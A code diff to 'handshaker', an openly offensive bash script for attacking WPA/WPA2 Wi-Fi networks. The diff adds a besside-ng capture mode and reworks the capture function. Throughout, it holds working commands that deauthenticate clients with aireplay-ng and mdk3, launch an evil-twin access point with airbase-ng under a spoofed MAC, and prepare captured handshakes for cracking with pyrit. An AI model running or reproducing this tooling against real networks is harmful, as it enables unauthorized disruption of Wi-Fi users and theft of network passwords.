@@ -35,6 +35,7 @@ handshaker - Detect, deauth, capture and crack WPA/2 handshakes. d4rkcat <rfarag
 		-d  - Deauth packets sent to each client (default 1)
 		-p  - Only attack clients above this power level
 		-g  - Use android GPS to record AP location
+		-n  - Use besside-ng to capture handshakes
 		-b  - Use evil twin AP to capture handshakes
 		-m  - Use mdk3 for deauth (default aireplay-ng)
 		-t  - Attempts to capture per AP (default 3)
@@ -260,6 +261,7 @@ pyrit"
 fapscan()																#Grep for AP ESSID
 {
 	clear
+	rm -rf $HOME/tmp*
 	if [ $NIC2 -z ] 2> /dev/null
 		then
 			gnome-terminal -t 'Scanning...' --geometry=100x20+0+320 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt WPA&
@@ -375,9 +377,14 @@ fclientscan()															#Find active clients
  [*] BSSID:\t\t $GRN$BSSID$RED
  [*] Channel:\t\t $GRN$CHAN$RED"
 	echo
-	echo $BLU" [*] Please wait while I search for$GRN active clients$BLU.. [*] "
-	DONE=""
 	rm -rf $HOME/tmp* 2> /dev/null
+	if [ $BESS -z ] 2> /dev/null
+		then
+			echo $BLU" [*] Please wait while I search for$GRN active clients$BLU.. [*] "
+		else
+			fautocap
+	fi
+	DONE=""
 	sleep 0.4
 	if [ $EVIL -z ] 2> /dev/null
 		then
@@ -599,6 +606,11 @@ fautobot()																#Automagically find new target clients
  [*] Power: $POWER"""
 	echo $RED" [*] We need this handshake [*] "$RST
 	
+	if [ $BESS = 1 ] 2> /dev/null
+		then
+			killall airodump-ng
+			fautocap
+	fi
 	if [ $EVIL = 1 ] 2> /dev/null
 		then
 			CIPHER=$(echo "$FCAT"| grep "$ESSID" | cut -d ',' -f 7 | head -n 1)
@@ -715,43 +727,18 @@ fautocap()																#Deauth targets and collect handshakes
 				then
 					TARGETS=$CLIENT
 			fi
-			if [ $NIC2 -z ] 2> /dev/null
+			if [ $BESS -z ] 2> /dev/null
 				then
-					if [ $MDK -z ] 2> /dev/null
-						then
-							MACNUM=0
-							for CLIENT in $TARGETS
-								do
-									MACNUM=$((MACNUM + 1))
-									echo
-									aireplay-ng -0 $PACKS -a $BSSID -c $CLIENT $MON1 | grep sdvds&
-									sleep $((PACKS + 1))'.5'
-									echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
-									fanalyze
-									if [ $GDONE = 1 ] 2> /dev/null
-										then
-											break
-									fi
-								done
-							sleep 3
-						else
-							echo $BSSID > $HOME/BSSIDB
-							gnome-terminal -t "mdk3 on $NIC" --geometry=60x20+720+320 -x mdk3 $MON1 d -b $HOME/BSSIDB&
-							sleep 5 && killall mdk3 2> /dev/null&
-							sleep 8
-					fi
-				else
-					if [ $EVIL -z ] 2> /dev/null
+					if [ $NIC2 -z ] 2> /dev/null
 						then
 							if [ $MDK -z ] 2> /dev/null
 								then
-									iw $MON2 set channel $CHAN
 									MACNUM=0
 									for CLIENT in $TARGETS
 										do
 											MACNUM=$((MACNUM + 1))
 											echo
-											aireplay-ng -0 $PACKS -a $BSSID -c $CLIENT $MON2 | grep rvzsdb&
+											aireplay-ng -0 $PACKS -a $BSSID -c $CLIENT $MON1 | grep sdvds&
 											sleep $((PACKS + 1))'.5'
 											echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
 											fanalyze
@@ -763,36 +750,103 @@ fautocap()																#Deauth targets and collect handshakes
 									sleep 3
 								else
 									echo $BSSID > $HOME/BSSIDB
-									gnome-terminal -t "MDK3 on $NIC2" --geometry=60x20+720+320 -x mdk3 $MON2 d -b $HOME/BSSIDB&
+									gnome-terminal -t "mdk3 on $NIC" --geometry=60x20+720+320 -x mdk3 $MON1 d -b $HOME/BSSIDB&
 									sleep 5 && killall mdk3 2> /dev/null&
 									sleep 8
 							fi
 						else
-							if [ $CHKBASE -z ] 2> /dev/null
+							if [ $EVIL -z ] 2> /dev/null
 								then
-									CHKBASE=1
-							fi
-							echo;echo $RED" [*]$GRN Evil Twin $ESSID$RED Launched on $GRN$NIC2" 
-							FAKEMAC=${BSSID:0:12}'13:37'
-							gnome-terminal -t "Evil Twin $ESSID listening on $NIC2.." --geometry=100x20+0+600 -x airbase-ng -v -c $CHAN -e $ESSID -W 1 $BARG$CIPHER -a $FAKEMAC -i $MON2 -I 50 -F $HOME/tmpe $MON2&
-							sleep 2
-							MACNUM=0
-							for CLIENT in $TARGETS
-								do
-									MACNUM=$((MACNUM + 1))
-									echo
-									aireplay-ng -0 $PACKS -a $BSSID -c $CLIENT $MON1 | grep rvzsdb&
-									sleep $((PACKS + 1))'.5'
-									echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
-									fanalyze
-									if [ $GDONE = 1 ] 2> /dev/null
+									if [ $MDK -z ] 2> /dev/null
 										then
-											break
+											iw $MON2 set channel $CHAN
+											MACNUM=0
+											for CLIENT in $TARGETS
+												do
+													MACNUM=$((MACNUM + 1))
+													echo
+													aireplay-ng -0 $PACKS -a $BSSID -c $CLIENT $MON2 | grep rvzsdb&
+													sleep $((PACKS + 1))'.5'
+													echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
+													fanalyze
+													if [ $GDONE = 1 ] 2> /dev/null
+														then
+															break
+													fi
+												done
+											sleep 3
+										else
+											echo $BSSID > $HOME/BSSIDB
+											gnome-terminal -t "MDK3 on $NIC2" --geometry=60x20+720+320 -x mdk3 $MON2 d -c $CHAN -b $HOME/BSSIDB&
+											sleep 5 && killall mdk3 2> /dev/null&
+											sleep 8
 									fi
-								done
-							sleep 6
+								else
+									if [ $CHKBASE -z ] 2> /dev/null
+										then
+											CHKBASE=1
+									fi
+									echo;echo $RED" [*]$GRN Evil Twin $ESSID$RED Launched on $GRN$NIC2" 
+									FAKEMAC=${BSSID:0:12}'13:37'
+									gnome-terminal -t "Evil Twin $ESSID listening on $NIC2.." --geometry=100x20+0+600 -x airbase-ng -v -c $CHAN -e $ESSID -W 1 $BARG$CIPHER -a $FAKEMAC -i $MON2 -I 50 -F $HOME/tmpe $MON2&
+									sleep 2
+									MACNUM=0
+									if [ $MDK -z ] 2> /dev/null
+										then
+											for CLIENT in $TARGETS
+												do
+													MACNUM=$((MACNUM + 1))
+													echo
+													aireplay-ng -0 $PACKS -a $BSSID -c $CLIENT $MON1 | grep rvzsdb&
+													sleep $PACKS
+													echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
+													fanalyze
+													if [ $GDONE = 1 ] 2> /dev/null
+														then
+															break
+													fi
+												done
+										else
+											killall -9 mdk3 2> /dev/null
+											echo $BSSID > $HOME/BSSIDB
+											gnome-terminal -t "MDK3 on $NIC" --geometry=60x20+720+320 -x mdk3 $MON1 d -c $CHAN -b $HOME/BSSIDB&
+											sleep 4 && killall mdk3 2> /dev/null&
+									fi
+									sleep 7
+							fi
+							
 					fi
-					
+				else
+					echo
+					echo $BLU" [*] Besside-ng working now.."$GRN
+					echo
+					ESSID=$(echo $ESSID | sed 's/ /_/g')
+					if [ $NIC2 -z ] 2> /dev/null
+						then
+							BESI=$(besside-ng -W -b $BSSID -c $CHAN $MON1 | grep Pwn | cut -d ']' -f 2)
+							sleep 0.5
+							if [ $BESI -z ] 2> /dev/null
+								then
+									GDONE=""
+								else
+									echo " [*]$BESI"
+									mv wpa.cap $OUTDIR/$ESSID-$DATE.cap
+									GDONE=1
+							fi
+						else
+							BESI=$(besside-ng -W -b $BSSID -c $CHAN $MON1 | grep Pwn | cut -d ']' -f 2)
+							sleep 0.5
+							if [ $BESI -z ] 2> /dev/null
+								then
+									GDONE=""
+								else
+									echo " [*]$BESI"
+									mv wpa.cap $OUTDIR/$ESSID-$DATE.cap
+									GDONE=1
+							fi
+					fi
+					rm -rf besside.log
+					rm -rf wep.cap
 			fi
 			if [ $GDONE -z ] 2> /dev/null
 				then
@@ -845,13 +899,16 @@ fautocap()																#Deauth targets and collect handshakes
 		done
 
 	echo
-	killall airodump-ng
+	killall airodump-ng 2> /dev/null
 	if [ $SILENT -z ] 2> /dev/null
 		then
 			beep -f 1200 -l 3 -r 2;beep -f 1500 -l 3 -r 1;beep -f 1600 -l 5 -r 1;beep -f 1800 -l 3 -r 1;beep -f 1200 -l 3 -r 2;beep -f 1500 -l 3 -r 1;beep -f 1600 -l 5 -r 1;beep -f 1800 -l 3 -r 1
 	fi
-	echo $GRN" [*] Handshake capture was successful! [*] "
-	echo
+	if [ $BESS -z ] 2> /dev/null
+		then
+			echo $GRN" [*] Handshake capture was successful! [*] "
+			echo
+	fi
 	ESSID=$(echo $ESSID | sed 's/ /_/g')
 	CHKBASE=""
 	DATE=$(date +%Y%m%d)
@@ -891,16 +948,18 @@ fautocap()																#Deauth targets and collect handshakes
 			echo -e "$ESSID\tBSSID:$BSSID\tCH:$CHAN\t$LOCATION$URL" >> $HOME/Desktop/cap/handshakes/cowpatty/got
 		else
 			echo -e "$ESSID\tBSSID:$BSSID\tCH:$CHAN\t$LOCATION$URL" >> $OUTDIR/got
-			if [ $EDONE -z ] 2> /dev/null
+			if [ $BESS -z ] 2> /dev/null
 				then
-					echo $GRN" [*] $(pyrit -r $HOME/tmp-01.cap -o "$OUTDIR/$ESSID-$DATE.cap" strip | grep 'New pcap-file')"$RST
-				else
-					echo $GRN" [*] $(pyrit -r $HOME/tmpe-01.cap -o "$OUTDIR/$ESSID-$DATE.cap" strip | grep 'New pcap-file')"$RST
+					if [ $EDONE -z ] 2> /dev/null
+						then
+							echo $GRN" [*] $(pyrit -r $HOME/tmp-01.cap -o "$OUTDIR/$ESSID-$DATE.cap" strip | grep 'New pcap-file')"$RST;echo
+						else
+							echo $GRN" [*] $(pyrit -r $HOME/tmpe-01.cap -o "$OUTDIR/$ESSID-$DATE.cap" strip | grep 'New pcap-file')"$RST;echo
+					fi
 			fi
 	fi
 	sleep 0.4
 	EDONE="";GDONE="";TARGETS="";BSSIDS="";LOCATION="";URL=""
-	echo
 	rm -rf $HOME/tmp*
 	sleep 2
 	if [ $DO = 'A' ] 2> /dev.null
@@ -1129,6 +1188,6 @@ ACNT=1
 for ARG in $@
 	do
 		ACNT=$((ACNT + 1))
-		case $ARG in "-d")PACKS=$(echo $@ | cut -d " " -f $ACNT);;"-m")MDK=1;;"-b")EVIL=1;;"-g")GPS=1;;"-i2")NIC2=$(echo $@ | cut -d " " -f $ACNT);;"-s")SILENT=1;;"-o")OUTDIR=$(echo $@ | cut -d " " -f $ACNT);;"-p")POWERLIMIT=$(echo $@ | cut -d " " -f $ACNT);;"-t")DEAU=1;TRIES=$(echo $@ | cut -d " " -f $ACNT);;"-c")CRACK=1;PCAP=$(echo $@ | cut -d " " -f $ACNT);;"-l")DO='L';;"-h")fhelp;;"-e")DO='E';ACNT=$((ACNT - 1));PARTIALESSID=$(echo $@ | cut -d " " -f $ACNT);;"-i")NIC=$(echo $@ | cut -d " " -f $ACNT);;"-w")WORDLIST=$(echo $@ | cut -d " " -f $ACNT);;"-a")DO='A';;"")fstart;esac
+		case $ARG in "-n")BESS=1;;"-d")PACKS=$(echo $@ | cut -d " " -f $ACNT);;"-m")MDK=1;;"-b")EVIL=1;;"-g")GPS=1;;"-i2")NIC2=$(echo $@ | cut -d " " -f $ACNT);;"-s")SILENT=1;;"-o")OUTDIR=$(echo $@ | cut -d " " -f $ACNT);;"-p")POWERLIMIT=$(echo $@ | cut -d " " -f $ACNT);;"-t")DEAU=1;TRIES=$(echo $@ | cut -d " " -f $ACNT);;"-c")CRACK=1;PCAP=$(echo $@ | cut -d " " -f $ACNT);;"-l")DO='L';;"-h")fhelp;;"-e")DO='E';ACNT=$((ACNT - 1));PARTIALESSID=$(echo $@ | cut -d " " -f $ACNT);;"-i")NIC=$(echo $@ | cut -d " " -f $ACNT);;"-w")WORDLIST=$(echo $@ | cut -d " " -f $ACNT);;"-a")DO='A';;"")fstart;esac
 	done
 fstart
